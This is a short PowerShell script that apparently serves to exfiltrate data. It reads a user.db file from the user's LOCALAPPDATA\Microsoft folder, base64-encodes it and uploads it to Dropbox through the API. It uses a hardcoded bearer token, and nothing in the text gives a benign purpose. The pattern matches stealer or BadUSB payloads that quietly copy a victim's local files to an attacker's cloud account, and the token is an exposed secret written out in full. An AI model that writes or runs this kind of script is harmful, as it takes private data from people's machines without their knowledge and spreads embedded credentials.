# Set your access token
$accessToken = "sl.Bbvw5BqXJMqNcK-5LU1mPMS_Tmk7sGjDbz6f56js_mt7KHtWkjQ8BmLdRlB_g4Y5T1jJlnkLAOnVk4mfZkTArTZQLLfZLCrzD80RUpVk0VvJz_kZPlj99ryk-YN2gCYyx7aUiClOhrak"

# Set the file path and destination path
$filePath = "$env:LOCALAPPDATA\Microsoft\user.db"
$destinationPath = "/user.db"

# Read file content as bytes
$fileContent = Get-Content -Path $filePath -Encoding Byte

# Convert file content to Base64
$fileContentBase64 = [System.Convert]::ToBase64String($fileContent)

# Prepare headers
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Dropbox-API-Arg" = '{"path": "' + $destinationPath + '", "mode": "add", "autorename": true, "mute": false}'
    "Content-Type" = "application/octet-stream"
}

# Make the API request
$apiUrl = "https://content.dropboxapi.com/2/files/upload"
$response = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $fileContentBase64

# Print response
Write-Host "File uploaded successfully. Response:" $response
